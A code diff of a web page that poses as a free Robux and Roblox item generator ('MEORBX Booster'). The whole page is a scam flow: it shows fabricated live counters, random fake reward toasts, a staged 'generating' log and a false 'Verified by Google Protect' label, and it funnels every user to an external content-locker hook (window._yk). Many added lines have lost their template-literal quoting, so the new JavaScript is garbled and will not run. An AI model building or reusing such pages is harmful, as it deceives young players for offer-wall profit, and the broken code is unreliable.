@@ -44,303 +44,142 @@
       pointer-events: none !important;
     }
 
-    /* ========= NEW ENHANCED LANDING PAGE STYLES ========= */
     .landing-screen {
       position: fixed;
       inset: 0;
       z-index: 2147483500;
       display: grid;
       place-items: center;
+      min-height: 100vh;
       padding: 20px;
-      background: radial-gradient(ellipse at 20% 30%, #0f172f, #020617);
-      overflow-y: auto;
-      font-family: 'Montserrat', sans-serif;
+      overflow: hidden;
+      background: linear-gradient(rgba(0,0,0,0.55), rgba(0,0,0,0.55)),
+  url("ii.png") center/cover no-repeat;
+      font-family: Nunito, Montserrat, Arial, sans-serif;
     }
 
-    .landing-screen::before {
-      content: '';
-      position: absolute;
+    .landing-screen.is-hidden {
+      display: none;
+    }
+
+    #stars {
+      position: fixed;
       inset: 0;
-      background: radial-gradient(circle at 50% 0%, rgba(34, 211, 238, 0.15), transparent 60%),
-                  repeating-linear-gradient(45deg, rgba(255,255,255,0.02) 0px, rgba(255,255,255,0.02) 2px, transparent 2px, transparent 8px);
+      z-index: 0;
       pointer-events: none;
     }
 
     .landing-card {
       position: relative;
-      z-index: 2;
-      width: min(520px, 92vw);
-      padding: 40px 32px 48px;
-      background: rgba(10, 14, 28, 0.75);
-      backdrop-filter: blur(16px);
-      border-radius: 48px;
-      border: 1px solid rgba(255,255,255,0.15);
-      box-shadow: 0 30px 50px rgba(0,0,0,0.5), 0 0 0 1px rgba(192,132,252,0.2) inset, 0 0 20px rgba(34,211,238,0.2);
+      z-index: 1;
+      width: min(420px, 95vw);
+      padding: 48px 56px 40px;
+      border: 1px solid rgba(255, 255, 255, .07);
+      border-radius: 20px;
+      background: #161b27;
       text-align: center;
-      transition: transform 0.3s ease, box-shadow 0.3s ease;
-      animation: cardFloat 3s ease-in-out infinite;
-    }
-
-    .landing-card:hover {
-      transform: translateY(-5px);
-      box-shadow: 0 40px 70px rgba(0,0,0,0.6), 0 0 0 1px rgba(192,132,252,0.4) inset, 0 0 30px rgba(34,211,238,0.4);
-    }
-
-    @keyframes cardFloat {
-      0% { transform: translateY(0px); }
-      50% { transform: translateY(-6px); }
-      100% { transform: translateY(0px); }
+      box-shadow: 0 24px 64px rgba(0, 0, 0, .5);
+      animation: landingCardIn .7s cubic-bezier(.22, 1, .36, 1) both;
     }
 
     .landing-logo {
       display: flex;
       align-items: center;
       justify-content: center;
-      width: 100px;
-      height: 100px;
-      margin: 0 auto 18px;
-      background: linear-gradient(135deg, #7c3aed, #06b6d4);
+      width: 88px;
+      height: 88px;
+      margin: 0 auto 20px;
+      border: 4px solid #fff;
       border-radius: 50%;
-      font-size: 58px;
+      background: #2d56ff;
+      color: #fff;
+      font-size: 48px;
       font-weight: 900;
-      font-family: 'Impact', fantasy;
-      color: white;
-      text-shadow: 0 4px 12px rgba(0,0,0,0.4);
-      box-shadow: 0 0 0 4px rgba(255,255,255,0.2), 0 15px 35px rgba(0,0,0,0.4);
-      animation: pulseGlow 2.5s infinite;
-    }
-
-    @keyframes pulseGlow {
-      0% { box-shadow: 0 0 0 0 rgba(192,132,252,0.4), 0 0 0 4px rgba(255,255,255,0.2); }
-      70% { box-shadow: 0 0 0 12px rgba(192,132,252,0), 0 0 0 8px rgba(255,255,255,0); }
-      100% { box-shadow: 0 0 0 0 rgba(192,132,252,0), 0 0 0 4px rgba(255,255,255,0.2); }
+      font-family: Impact, fantasy;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, .35);
+      animation: landingLogoPulse 3s ease-in-out infinite;
     }
 
     .landing-card h1 {
-      font-size: 2.4rem;
-      font-weight: 800;
-      background: linear-gradient(135deg, #fff, #c084fc, #22d3ee);
-      background-clip: text;
-      -webkit-background-clip: text;
-      color: transparent;
-      margin-bottom: 8px;
-      letter-spacing: -0.5px;
+      margin: 0 0 6px;
+      color: #e8eaf6;
+      font-family: Impact, fantasy;
+      font-size: 32px;
+      font-weight: 900;
+      letter-spacing: 0;
     }
 
-    .badge-trust {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 16px;
-      margin: 16px 0 20px;
-    }
-
-    .trust-item {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      background: rgba(255,255,255,0.05);
-      padding: 6px 14px;
-      border-radius: 40px;
-      font-size: 12px;
-      font-weight: 700;
-      color: #cbd5e1;
-      backdrop-filter: blur(4px);
-    }
-
-    .trust-item::before {
-      content: "✓";
-      color: #34d399;
-      font-weight: bold;
+    .landing-card .subtitle {
+      margin: 0 0 32px;
+      color: #6b7280;
       font-size: 14px;
-    }
-
-    .live-counter-strip {
-      background: rgba(0,0,0,0.45);
-      border-radius: 60px;
-      padding: 10px 16px;
-      margin: 16px 0 12px;
-      display: flex;
-      justify-content: space-between;
-      flex-wrap: wrap;
-      gap: 12px;
       font-weight: 800;
-      border: 1px solid rgba(34,211,238,0.4);
-    }
-
-    .counter-item {
-      display: flex;
-      align-items: center;
-      gap: 6px;
-      font-size: 14px;
-      color: #e2e8f0;
-    }
-
-    .online-dot {
-      width: 10px;
-      height: 10px;
-      background: #22d3ee;
-      border-radius: 50%;
-      box-shadow: 0 0 8px #22d3ee;
-      animation: blinkLive 1.2s infinite;
-    }
-
-    @keyframes blinkLive {
-      0% { opacity: 1; transform: scale(1);}
-      50% { opacity: 0.4; transform: scale(0.8);}
-      100% { opacity: 1; transform: scale(1);}
-    }
-
-    .countdown-urgency {
-      background: rgba(239, 68, 68, 0.15);
-      border-radius: 60px;
-      padding: 8px 12px;
-      margin: 12px 0 20px;
-      font-size: 13px;
-      font-weight: 800;
-      color: #fca5a5;
-      display: inline-flex;
-      align-items: center;
-      gap: 12px;
-      backdrop-filter: blur(8px);
-    }
-
-    .countdown-timer {
-      background: #00000066;
-      padding: 4px 12px;
-      border-radius: 40px;
-      font-family: monospace;
-      font-size: 1.2rem;
-      letter-spacing: 1px;
-    }
-
-    .recent-claims {
-      background: rgba(0, 0, 0, 0.35);
-      border-radius: 24px;
-      padding: 12px;
-      margin: 16px 0 20px;
-      height: 68px;
-      overflow: hidden;
-      position: relative;
-    }
-
-    .claim-feed {
-      display: flex;
-      flex-direction: column;
-      gap: 6px;
-      animation: scrollFeed 20s linear infinite;
-    }
-
-    .claim-feed span {
-      display: block;
-      font-size: 13px;
-      font-weight: 600;
-      color: #e2e8f0;
-    }
-
-    .claim-feed strong {
-      color: #c084fc;
-    }
-
-    @keyframes scrollFeed {
-      0% { transform: translateY(0);}
-      100% { transform: translateY(-100%);}
     }
 
     .landing-actions {
       display: flex;
       flex-direction: column;
       gap: 14px;
-      margin-top: 12px;
     }
 
     .landing-btn {
       width: 100%;
-      padding: 16px 12px;
-      border-radius: 120px;
-      font-weight: 800;
-      font-size: 1.25rem;
-      letter-spacing: 0.5px;
-      transition: all 0.25s cubic-bezier(0.2, 0.9, 0.4, 1.1);
-      border: none;
-      cursor: pointer;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      gap: 12px;
-      position: relative;
-      overflow: hidden;
-    }
-
-    .landing-btn::after {
-      content: '';
-      position: absolute;
-      top: 0;
-      left: -100%;
-      width: 100%;
-      height: 100%;
-      background: linear-gradient(90deg, transparent, rgba(255,255,255,0.25), transparent);
-      transition: left 0.5s;
-    }
-
-    .landing-btn:hover::after {
-      left: 100%;
+      padding: 16px;
+      border-radius: 999px;
+      color: #fff;
+      font-family: Impact, fantasy;
+      font-size: 20px;
+      letter-spacing: .5px;
+      transition: transform .2s ease, filter .2s ease;
     }
 
     .landing-btn:hover {
-      transform: scale(1.02) translateY(-3px);
-      filter: brightness(1.08);
-      box-shadow: 0 16px 28px rgba(0,0,0,0.3);
+      transform: translateY(-2px);
+      filter: brightness(1.1);
     }
 
-    .btn-rbx {
-      background: linear-gradient(95deg, #f59e0b, #d97706);
-      box-shadow: 0 8px 20px rgba(245,158,11,0.4);
-      color: white;
+    .landing-btn.cyan {
+      background: linear-gradient(90deg, #00c9f7, #00d4ff);
+      box-shadow: 0 6px 20px rgba(0, 212, 255, .3);
     }
 
-    .btn-brainrot {
-      background: linear-gradient(95deg, #a855f7, #7e22ce);
-      box-shadow: 0 8px 20px rgba(168,85,247,0.4);
+    .landing-btn.red {
+      background: linear-gradient(90deg, #c72b2b, #e03535);
+      box-shadow: 0 6px 20px rgba(224, 53, 53, .3);
     }
 
-    .btn-tsunami {
-      background: linear-gradient(95deg, #06b6d4, #0891b2);
-      box-shadow: 0 8px 20px rgba(6,182,212,0.4);
+    .landing-btn.green {
+      background: linear-gradient(90deg, #20a832, #27c93f);
+      box-shadow: 0 6px 20px rgba(39, 201, 63, .3);
     }
 
-    .landing-footer {
-      margin-top: 32px;
-      font-size: 10px;
-      color: #64748b;
-      font-weight: 600;
-      border-top: 1px solid rgba(255,255,255,0.1);
-      padding-top: 18px;
+    .landing-card footer {
+      margin-top: 24px;
+      color: rgba(232, 234, 246, .62);
+      font-size: 12px;
+      font-weight: 800;
     }
 
     .landing-toast {
       position: fixed;
       left: 50%;
-      bottom: 24px;
-      transform: translateX(-50%);
-      background: #1e293bdd;
-      backdrop-filter: blur(16px);
-      padding: 10px 20px;
-      border-radius: 60px;
-      color: white;
-      font-weight: 700;
+      bottom: 32px;
       z-index: 2147483600;
-      transition: all 0.3s;
+      padding: 12px 24px;
+      border-radius: 999px;
+      background: #1e2535;
+      color: #fff;
       opacity: 0;
-      pointer-events: none;
+      transform: translateX(-50%) translateY(80px);
+      transition: opacity .3s ease, transform .3s ease;
+      font-weight: 800;
     }
 
     .landing-toast.show {
       opacity: 1;
-      transform: translateX(-50%) translateY(0px);
+      transform: translateX(-50%) translateY(0);
     }
 
-    /* ========= ORIGINAL APP & ITEM STYLES (unchanged) ========= */
     .app {
       width: min(100%, 460px);
       margin: 0 auto;
@@ -1203,16 +1042,15 @@
     @keyframes pulse { 70% { transform: scale(1.04); box-shadow: 0 0 0 12px rgba(147, 51, 234, 0); } }
     @keyframes toastIn { from { transform: translateX(390px); opacity: 0; } to { transform: translateX(0); opacity: 1; } }
     @keyframes toastOut { to { transform: translateX(390px); opacity: 0; } }
+    @keyframes landingCardIn { from { opacity: 0; transform: translateY(30px) scale(.96); } to { opacity: 1; transform: translateY(0) scale(1); } }
+    @keyframes landingLogoPulse { 50% { box-shadow: 0 8px 40px rgba(0, 0, 0, .5); } }
 
     @media (max-width: 390px) {
       .app { padding-inline: 12px; }
       .panel { padding: 18px 14px; }
       .choice-title { font-size: 18px; }
       .reward-number { font-size: 32px; }
-      .landing-card { padding: 28px 20px 36px; }
-      .landing-card h1 { font-size: 1.8rem; }
-      .landing-btn { font-size: 1rem; padding: 14px; }
-      .live-counter-strip { flex-direction: column; align-items: center; }
+      .landing-card { padding: 38px 24px 32px; }
       .item-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 12px; }
       .loot-card { min-height: 150px; }
       .loot-art { width: 72px; height: 72px; font-size: 38px; }
@@ -1275,54 +1113,25 @@
     </symbol>
   </svg>
 
-  <!-- NEW ENHANCED LANDING PAGE -->
   <section class="landing-screen" id="landingScreen">
     <canvas id="stars"></canvas>
     <div class="landing-card">
-      <div class="landing-logo">₿</div>
-      <h1>MEORBX BOOSTER 2026</h1>
-      <div class="badge-trust">
-        <span class="trust-item">No Password</span>
-        <span class="trust-item">Instant Delivery</span>
-        <span class="trust-item">2M+ Users</span>
-      </div>
-
-      <div class="live-counter-strip">
-        <div class="counter-item"><i class="online-dot"></i> <span id="liveUsersLanding">18,342</span> online</div>
-        <div class="counter-item">🎁 <span id="totalRewardsLanding">4,892,103</span> claimed</div>
-        <div class="counter-item">⚡ <span id="todayClaims">9,421</span> today</div>
-      </div>
-
-      <div class="countdown-urgency">
-        ⏳ Limited slots remaining
-        <span class="countdown-timer" id="urgencyTimer">10:00</span>
-      </div>
-
-      <div class="recent-claims">
-        <div class="claim-feed" id="claimFeed">
-          <span>✨ <strong>@RoxyBlox_07</strong> claimed 5,800 Robux</span>
-          <span>💎 <strong>@NinjaPro223</strong> claimed 700 Diamonds</span>
-          <span>🧠 <strong>@BrainRotLord</strong> stole Strawberry Elephant</span>
-          <span>🌊 <strong>@TsunamiPlayer</strong> escaped with Dragon Cannelloni</span>
-          <span>💰 <strong>@RobuxHunter</strong> unlocked 25,000 Robux</span>
-        </div>
-      </div>
-
+      <div class="landing-logo">R</div>
+      <h1>Welcome RobloxPlayer!</h1>
+      <p class="subtitle">Unlock Rewards Instantly</p>
       <div class="landing-actions">
-        <button class="landing-btn btn-rbx" onclick="handleLandingEntry('rbx')">💎 GET ROBUX NOW</button>
-        <button class="landing-btn btn-brainrot" onclick="handleLandingEntry('brainrot')">🧠 STEAL A BRAINROT</button>
-        <button class="landing-btn btn-tsunami" onclick="handleLandingEntry('tsunami')">🌊 ESCAPE TSUNAMI</button>
+        <button class="landing-btn cyan" data-entry="rbx" onclick="handleLandingEntry('rbx')">RBX HERE</button>
+        <button class="landing-btn red" data-entry="brainrot" onclick="handleLandingEntry('brainrot')">STEAL A BRAINROT</button>
+        <button class="landing-btn green" data-entry="tsunami" onclick="handleLandingEntry('tsunami')">ESCAPE TSUNAMI</button>
       </div>
-      <div class="landing-footer">
-        🔒 100% safe & verified · No Roblox password required · Instant processing
-      </div>
+      <footer>© 2026 | All Rights Reserved</footer>
     </div>
-    <div class="landing-toast" id="landingToast">✨ Loading portal...</div>
+    <div class="landing-toast" id="landingToast"></div>
   </section>
 
-  <!-- ORIGINAL APP & ITEM SECTIONS (unchanged) -->
   <main class="app hidden" id="generatedApp">
     <div class="toast-wrap" id="toastWrap"></div>
+
     <header class="brand">
       <div class="brand-mark">
         <svg class="brand-logo" viewBox="0 0 520 160" role="img" aria-label="MEORBX Booster"><use href="#logoIcon"></use></svg>
@@ -1333,6 +1142,7 @@
         <p class="subhead">The latest updated online tool for Roblox</p>
       </div>
     </header>
+
     <section class="metrics" aria-label="Live reward counters">
       <div class="live"><span><i class="dot"></i> LIVE TODAY</span></div>
       <h2>People Who Claimed Today</h2>
@@ -1349,6 +1159,7 @@
         </div>
       </div>
     </section>
+
     <section class="panel" id="phase0">
       <h2>Choose Your Reward Type</h2>
       <div class="reward-grid">
@@ -1366,15 +1177,26 @@
         </button>
       </div>
     </section>
+
     <section class="panel hidden" id="phase1">
       <h2>Enter Your Roblox Username</h2>
-      <div class="input-wrap"><span>@</span><input id="userInput" type="text" autocomplete="nickname" placeholder="Your Roblox Username"></div>
+      <div class="input-wrap">
+        <span>@</span>
+        <input id="userInput" type="text" autocomplete="nickname" placeholder="Your Roblox Username">
+      </div>
       <button class="primary-btn" id="lookupBtn"><span id="lookupText">SEARCH USER</span></button>
       <div class="alert" id="alertBox">Please enter a username to continue.</div>
+
       <div class="account" id="accountCard">
         <div class="profile">
-          <div class="avatar-wrap"><svg class="avatar" viewBox="0 0 160 160" role="img" aria-label="User avatar"><use href="#avatarIcon"></use></svg><i class="activity"></i></div>
-          <div><h3 id="fullName">Player</h3><p id="userHandle">@player</p></div>
+          <div class="avatar-wrap">
+            <svg class="avatar" viewBox="0 0 160 160" role="img" aria-label="User avatar"><use href="#avatarIcon"></use></svg>
+            <i class="activity"></i>
+          </div>
+          <div>
+            <h3 id="fullName">Player</h3>
+            <p id="userHandle">@player</p>
+          </div>
         </div>
         <div class="details">
           <div class="detail"><strong>📅</strong><span class="detail-label">Created</span><span class="detail-value" id="joinDate">Jan 12, 2023</span></div>
@@ -1384,6 +1206,7 @@
         <button class="primary-btn" id="continueBtn" style="margin-top:16px">CONTINUE</button>
       </div>
     </section>
+
     <section class="panel hidden" id="phase2">
       <h2>Select Robux Amount</h2>
       <div class="amount-grid" id="robuxChoices">
@@ -1393,6 +1216,7 @@
         <button class="amount" data-kind="robux" data-amount="100000"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg><div class="amount-number">100,000</div><div class="available">AVAILABLE</div></button>
       </div>
     </section>
+
     <section class="panel hidden" id="phase2_5">
       <h2>Select Diamond Amount</h2>
       <div class="amount-grid">
@@ -1402,48 +1226,77 @@
         <button class="amount" data-kind="diamond" data-amount="7000"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#diamondIcon"></use></svg><div class="amount-number">7,000</div><div class="available">AVAILABLE</div></button>
       </div>
     </section>
+
     <section class="panel hidden" id="phase3">
       <h2>Processing Request</h2>
-      <div class="showcase"><span id="rewardIcon"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg></span><div><div class="reward-number" id="rewardNumber">0</div><div class="reward-type" id="rewardType">Generating</div></div></div>
+      <div class="showcase">
+        <span id="rewardIcon"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg></span>
+        <div>
+          <div class="reward-number" id="rewardNumber">0</div>
+          <div class="reward-type" id="rewardType">Generating</div>
+        </div>
+      </div>
       <div class="progress-row"><span>⚙ Processing request...</span><strong id="taskPercent">0%</strong></div>
       <div class="bar"><span id="taskBar"></span></div>
       <div class="logs" id="taskLogs"><div>✓ Connecting to servers...</div></div>
       <p class="subhead" style="text-align:center">User: <strong id="userShow">Username</strong></p>
     </section>
+
     <section class="panel hidden" id="phase4">
       <div id="checkSection">
         <h2>Verified by Google Protect</h2>
         <div class="ready-icon" id="readyIcon"><svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#coinIcon"></use></svg></div>
-        <div style="text-align:center"><p id="prizeShow" style="font-weight:800;margin:0 0 8px"></p><p class="subhead">User: <strong id="userShow2">Username</strong></p></div>
-        <div class="info-box"><div>ℹ Your rewards are ready to be added</div><div>⚠ Click NEXT for the final step</div></div>
+        <div style="text-align:center">
+          <p id="prizeShow" style="font-weight:800;margin:0 0 8px"></p>
+          <p class="subhead">User: <strong id="userShow2">Username</strong></p>
+        </div>
+        <div class="info-box">
+          <div>ℹ Your rewards are ready to be added</div>
+          <div>⚠ Click NEXT for the final step</div>
+        </div>
         <button class="primary-btn pulse" id="claimBtn">🎁 NEXT</button>
       </div>
       <div id="doneSection" class="hidden">
         <h2 style="color:var(--emerald)">Generated Successfully!</h2>
-        <div class="success"><div id="completePrize"></div><p>Generated for <span id="userShow3">Username</span></p></div>
+        <div class="success">
+          <div id="completePrize"></div>
+          <p>Generated for <span id="userShow3">Username</span></p>
+        </div>
         <div class="notice">Verification is required to unlock the reward page. No Roblox password is needed.</div>
         <button class="primary-btn pulse" id="lockerBtn" onclick="triggerContentLocker()" style="background:var(--emerald)">NEXT 🎁</button>
         <p class="subhead" style="text-align:center;margin-top:14px">This offer expires in <span id="timer">05:00</span></p>
       </div>
     </section>
-    <footer class="footer"><p>Fan-made demo interface. Roblox, the Roblox logo and Robux are registered trademarks of Roblox Corporation.</p></footer>
+
+    <footer class="footer">
+      <p>Fan-made demo interface. Roblox, the Roblox logo and Robux are registered trademarks of Roblox Corporation.</p>
+    </footer>
   </main>
 
   <section class="item-app hidden" id="itemApp">
     <div class="item-shell">
       <header class="item-hero">
         <div class="item-logo" id="itemLogo">🌊</div>
-        <div><h1 id="itemTitle">Escape Tsunami Rewards</h1><p id="itemSubtitle">Choose one item, verify your username, then unlock the final reward step.</p></div>
-        <div class="active-strip"><span>ACTIVE USERS</span><strong id="itemActiveUsers">12,845</strong></div>
+        <div>
+          <h1 id="itemTitle">Escape Tsunami Rewards</h1>
+          <p id="itemSubtitle">Choose one item, verify your username, then unlock the final reward step.</p>
+        </div>
+        <div class="active-strip">
+          <span>ACTIVE USERS</span>
+          <strong id="itemActiveUsers">12,845</strong>
+        </div>
       </header>
+
       <div class="select-line" id="itemSelectLine">Select Your Tsunami Reward</div>
       <div class="item-grid" id="itemGrid"></div>
     </div>
   </section>
-  <div class="item-modal" id="itemModal" aria-hidden="true"><div class="item-dialog" id="itemDialog"></div></div>
+
+  <div class="item-modal" id="itemModal" aria-hidden="true">
+    <div class="item-dialog" id="itemDialog"></div>
+  </div>
 
   <script>
-    // ========== ORIGINAL APP LOGIC (preserved) ==========
     const $ = (id) => document.getElementById(id);
     const phases = ["phase0", "phase1", "phase2", "phase2_5", "phase3", "phase4"].map($);
     const state = { type: "", amount: 0, user: "" };
@@ -1500,6 +1353,11 @@
       }
     };
 
+    function iconSvg(name, extraClass = "") {
+      const viewBox = name === "avatar" ? "0 0 160 160" : "0 0 128 128";
+      return <svg class="icon ${extraClass}" viewBox="${viewBox}" aria-hidden="true"><use href="#${name}Icon"></use></svg>;
+    }
+
     function showLandingToast(message) {
       const toast = $("landingToast");
       toast.textContent = message;
@@ -1523,7 +1381,7 @@
       itemState.username = "";
       $("landingScreen").classList.add("is-hidden");
       $("generatedApp").classList.add("hidden");
-      $("itemApp").className = `item-app ${config.themeClass}`.trim();
+      $("itemApp").className = item-app ${config.themeClass}.trim();
       $("itemLogo").textContent = config.logo;
       $("itemTitle").textContent = config.title;
       $("itemSubtitle").textContent = config.subtitle;
@@ -1535,11 +1393,11 @@
 
     function renderItemGrid(config) {
       $("itemGrid").innerHTML = config.items.map(([icon, name, rarity]) => 
-        `<button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}" type="button">
+        <button class="loot-card" data-name="${name}" data-icon="${icon}" data-rarity="${rarity}" type="button">
           <div class="loot-art">${icon}</div>
           <div class="loot-name">${name}</div>
           <div class="rarity">${rarity}</div>
-        </button>`
+        </button>
       ).join("");
       document.querySelectorAll(".loot-card").forEach((card) => {
         card.addEventListener("click", () => openItemModal({
@@ -1550,7 +1408,7 @@
       });
     }
 
-    window.handleLandingEntry = function(entry) {
+    function handleLandingEntry(entry) {
       if (entry === "rbx") {
         showLandingToast("Loading your RBX...");
         setTimeout(enterGeneratedApp, 600);
@@ -1561,18 +1419,22 @@
         showLandingToast(itemConfigs.tsunami.toast);
         setTimeout(() => enterItemApp("tsunami"), 600);
       }
-    };
+    }
 
-    window.triggerContentLocker = function() {
+    window.handleLandingEntry = handleLandingEntry;
+
+    function triggerContentLocker() {
       if (typeof window._yk === "function") {
         window._yk();
         return;
       }
+
       const button = $("lockerBtn");
       const original = button.textContent;
       button.disabled = true;
       button.textContent = "Loading...";
       let tries = 0;
+
       const waitForLocker = setInterval(() => {
         tries += 1;
         if (typeof window._yk === "function") {
@@ -1587,21 +1449,24 @@
           alert("The unlock system is still loading. Please check your connection and try again.");
         }
       }, 250);
-    };
+    }
+
+    window.triggerContentLocker = triggerContentLocker;
 
     function openItemModal(item) {
       itemState.selected = item;
       $("itemModal").classList.add("visible");
       $("itemModal").setAttribute("aria-hidden", "false");
       $("itemDialog").innerHTML = 
-        `<div class="modal-art">${item.icon}</div>
+        <div class="modal-art">${item.icon}</div>
         <h2>${item.name}</h2>
         <p>Would you like to get this ${item.rarity} reward?</p>
         <input id="itemUsername" type="text" placeholder="Enter your Roblox username" autocomplete="nickname">
         <div class="dialog-actions">
           <button class="small-btn cancel" id="itemCancel" type="button">Cancel</button>
           <button class="small-btn continue" id="itemContinue" type="button">Continue</button>
-        </div>`;
+        </div>
+      ;
       $("itemCancel").addEventListener("click", closeItemModal);
       $("itemContinue").addEventListener("click", searchItemUser);
       $("itemUsername").addEventListener("keydown", (event) => {
@@ -1622,28 +1487,30 @@
         return;
       }
       itemState.username = username;
-      showItemLoading(`Searching for @${username}`);
+      showItemLoading(Searching for @${username});
       setTimeout(() => showItemResult(username), 1200);
     }
 
     function showItemLoading(text) {
       $("itemDialog").innerHTML = 
-        `<div class="loader-stack">
+        <div class="loader-stack">
           <div class="loader-ring"></div>
           <h2>${text}</h2>
           <p>Please wait while we prepare your request.</p>
-        </div>`;
+        </div>
+      ;
     }
 
     function showItemResult(username) {
       const item = itemState.selected;
       $("itemDialog").innerHTML = 
-        `<div class="modal-art">${item.icon}</div>
+        <div class="modal-art">${item.icon}</div>
         <h2>@${username}</h2>
         <p>${item.name} is ready to transfer.</p>
-        <button class="primary-btn" id="itemTransfer" type="button">Continue</button>`;
+        <button class="primary-btn" id="itemTransfer" type="button">Continue</button>
+      ;
       $("itemTransfer").addEventListener("click", () => {
-        showItemLoading(`Transferring ${item.name} to @${username}`);
+        showItemLoading(Transferring ${item.name} to @${username});
         setTimeout(showItemFinal, 1400);
       });
     }
@@ -1651,20 +1518,22 @@
     function showItemFinal() {
       const item = itemState.selected;
       $("itemDialog").innerHTML = 
-        `<div class="final-card">
+        <div class="final-card">
           <div class="modal-art">${item.icon}</div>
           <h2>${item.name} Generated!</h2>
           <p>Final verification is required to unlock the reward page.</p>
           <button class="primary-btn pulse" type="button" onclick="triggerContentLocker()">NEXT 🎁</button>
-        </div>`;
+        </div>
+      ;
     }
 
     function setupStars() {
       const canvas = $("stars");
-      if (!canvas) return;
       const ctx = canvas.getContext("2d");
-      let width = 0, height = 0;
+      let width = 0;
+      let height = 0;
       let stars = [];
+
       function resizeStars() {
         width = canvas.width = window.innerWidth;
         height = canvas.height = window.innerHeight;
@@ -1675,22 +1544,28 @@
           a: Math.random()
         }));
       }
+
       function drawStars() {
         ctx.clearRect(0, 0, width, height);
         stars.forEach((star) => {
           ctx.beginPath();
           ctx.arc(star.x, star.y, star.r, 0, Math.PI * 2);
-          ctx.fillStyle = `rgba(255,255,255,${star.a})`;
+          ctx.fillStyle = rgba(255,255,255,${star.a});
           ctx.fill();
         });
         requestAnimationFrame(drawStars);
       }
+
       window.addEventListener("resize", resizeStars);
       resizeStars();
       drawStars();
     }
 
     setupStars();
+
+    document.querySelectorAll(".landing-btn").forEach((button) => {
+      button.addEventListener("click", () => handleLandingEntry(button.dataset.entry));
+    });
 
     function showPhase(id) {
       phases.forEach((phase) => phase.classList.toggle("hidden", phase.id !== id));
@@ -1729,7 +1604,7 @@
       const gems = [100, 250, 700, 1500, 7000];
       const div = document.createElement("div");
       div.className = "toast";
-      div.innerHTML = `<svg class="icon avatar-icon" viewBox="0 0 160 160" aria-hidden="true"><use href="#avatarIcon"></use></svg><div><strong>${names[Math.floor(Math.random() * names.length)]}</strong><span>Received ${format(coins[Math.floor(Math.random() * coins.length)])} Robux + ${format(gems[Math.floor(Math.random() * gems.length)])} Diamonds</span></div>`;
+      div.innerHTML = ${iconSvg("avatar", "avatar-icon")}<div><strong>${names[Math.floor(Math.random() * names.length)]}</strong><span>Received ${format(coins[Math.floor(Math.random() * coins.length)])} Robux + ${format(gems[Math.floor(Math.random() * gems.length)])} Diamonds</span></div>;
       $("toastWrap").appendChild(div);
       setTimeout(() => div.remove(), 5000);
     }
@@ -1756,7 +1631,7 @@
       setTimeout(() => {
         state.user = user;
         $("fullName").textContent = user;
-        $("userHandle").textContent = `@${user}`;
+        $("userHandle").textContent = @${user};
         $("joinDate").textContent = new Date(Date.now() - 1000 * 60 * 60 * 24 * (250 + user.length * 17)).toLocaleDateString("en-US", { year: "numeric", month: "short", day: "numeric" });
         $("accountCard").classList.add("visible");
         $("lookupText").textContent = "SEARCH USER";
@@ -1798,14 +1673,14 @@
 
     function log(text) {
       const line = document.createElement("div");
-      line.textContent = `✓ ${text}`;
+      line.textContent = ✓ ${text};
       $("taskLogs").appendChild(line);
       $("taskLogs").scrollTop = $("taskLogs").scrollHeight;
     }
 
     function runProgress() {
       const isDiamond = state.type === "diamond";
-      $("rewardIcon").innerHTML = `<svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#${isDiamond ? "diamond" : "coin"}Icon"></use></svg>`;
+      $("rewardIcon").innerHTML = iconSvg(isDiamond ? "diamond" : "coin");
       $("rewardType").textContent = isDiamond ? "Diamonds" : "Robux";
       $("taskBar").style.width = "0";
       $("taskPercent").textContent = "0%";
@@ -1817,21 +1692,21 @@
       let progress = 0;
       const tick = setInterval(() => {
         progress += 1;
-        $("taskBar").style.width = `${progress}%`;
-        $("taskPercent").textContent = `${progress}%`;
+        $("taskBar").style.width = ${progress}%;
+        $("taskPercent").textContent = ${progress}%;
         if (progress === 10) log("Searching database...");
         if (progress === 30) log("Account found!");
-        if (progress === 45) log(`User ${state.user} confirmed`);
-        if (progress === 60) log(`Generating ${format(state.amount)} ${isDiamond ? "Diamonds" : "Robux"}...`);
+        if (progress === 45) log(User ${state.user} confirmed);
+        if (progress === 60) log(Generating ${format(state.amount)} ${isDiamond ? "Diamonds" : "Robux"}...);
         if (progress === 75) log("Encrypting data...");
         if (progress === 90) log("Preparing final confirmation...");
         if (progress === 100) {
           clearInterval(tick);
           setTimeout(() => {
             const icon = isDiamond ? "diamond" : "coin";
-            $("readyIcon").innerHTML = `<svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#${icon}Icon"></use></svg>`;
-            $("prizeShow").textContent = `${format(state.amount)} ${isDiamond ? "Diamonds are" : "Robux are"} ready!`;
-            $("completePrize").innerHTML = `<svg class="icon" viewBox="0 0 128 128" aria-hidden="true"><use href="#${icon}Icon"></use></svg> <strong>${format(state.amount)} ${isDiamond ? "Diamonds" : "Robux"}</strong>`;
+            $("readyIcon").innerHTML = iconSvg(icon);
+            $("prizeShow").textContent = ${format(state.amount)} ${isDiamond ? "Diamonds are" : "Robux are"} ready!;
+            $("completePrize").innerHTML = ${iconSvg(icon)} <strong>${format(state.amount)} ${isDiamond ? "Diamonds" : "Robux"}</strong>;
             showPhase("phase4");
           }, 700);
         }
@@ -1846,7 +1721,7 @@
         seconds -= 1;
         const minutes = String(Math.floor(seconds / 60)).padStart(2, "0");
         const rest = String(seconds % 60).padStart(2, "0");
-        $("timer").textContent = `${minutes}:${rest}`;
+        $("timer").textContent = ${minutes}:${rest};
         if (seconds <= 0) clearInterval(countdown);
       }, 1000);
     });
@@ -1854,71 +1729,6 @@
     setInterval(updateMetrics, 2600);
     setInterval(toast, 5200);
     setTimeout(toast, 900);
-
-    // ========== NEW LANDING PAGE DYNAMICS ==========
-    (function() {
-      const liveSpan = document.getElementById('liveUsersLanding');
-      const totalSpan = document.getElementById('totalRewardsLanding');
